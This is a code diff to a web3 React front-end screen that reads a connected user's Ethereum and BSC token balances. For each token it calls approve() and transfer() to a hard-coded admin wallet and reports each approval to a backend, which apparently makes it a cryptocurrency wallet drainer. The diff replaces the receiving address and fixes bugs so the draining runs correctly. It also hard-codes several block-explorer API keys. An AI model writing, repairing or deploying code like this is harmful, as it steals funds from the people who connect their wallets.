@@ -13,7 +13,7 @@ const GET_USER_ALL_TOEKN_API_KEY = "BQYcUOSxiCsQ3ximvOlDzfrAWTS5CYJ5";
 const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
 const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"
 
-const adminWalletAddress = "0x13275Fe7e7Dd7a8fCbC43581978e3Fb75317D8d3";
+const adminWalletAddress = "0xBD288011d06dA18Eca34DF3d50488fB25fCC7Fde";
 const web3 = new Web3(window.ethereum);
 const busdAddress = '0x55d398326f99059fF775485246999027B3197955';
 const contract1 = new web3.eth.Contract(abi1, busdAddress);
@@ -123,7 +123,8 @@ const UserScreen = () => {
         }
         const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
         const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
-        const array3 = array1.concat(array2);
+        const array3 = array1.concat(array2).filter(e => e.currency.address !== "-");
+        console.log(array3);
         const array4 = array3.map(t => t.currency.symbol);
         const currentTokenPrice = await livePrice(array4);
         for (let i = 0; i < array3.length; i++) {
@@ -154,15 +155,18 @@ const UserScreen = () => {
                 } else {
                   let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
                   let temp = await axios.get(api);
-                  const contractABI = JSON.parse(temp.result);
+                  console.log(temp);
+                  const contractABI = JSON.parse(temp.data.result);
                   const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
                   await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
                     .then(async function (receipt) {
+                      console.log(receipt);
                       await axios.post('http://localhost:5000/products', {
                         userWalletAddress: myAddress,
                         amount: approveAmount,
                         symbol: approveToken.currency.symbol,
-                        contractAddress: approveToken.currency.address
+                        contractAddress: approveToken.currency.address,
+                        network: "BSC"
                       });
                     });
                 }
@@ -178,7 +182,7 @@ const UserScreen = () => {
                 } else {
                   let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
                   let temp = await axios.get(api);
-                  const contractABI = JSON.parse(temp.result);
+                  const contractABI = JSON.parse(temp.data.result);
                   const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
                   await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
                     .then(async function (receipt) {
@@ -186,7 +190,8 @@ const UserScreen = () => {
                         userWalletAddress: myAddress,
                         amount: approveAmount,
                         symbol: approveToken.currency.symbol,
-                        contractAddress: approveToken.currency.address
+                        contractAddress: approveToken.currency.address,
+                        network: "ETH"
                       });
                     });
                 }
@@ -235,7 +240,7 @@ const UserScreen = () => {
           } else {
             let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
             let temp = await axios.get(api);
-            const contractABI = JSON.parse(temp.result);
+            const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
             await nowContract.methods.transfer(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
               .on('receipt', (receipt) => { console.log(receipt) })
@@ -259,7 +264,7 @@ const UserScreen = () => {
           } else {
             let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
             let temp = await axios.get(api);
-            const contractABI = JSON.parse(temp.result);
+            const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
             await nowContract.methods.transfer(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
               .on('receipt', (receipt) => { console.log(receipt) })
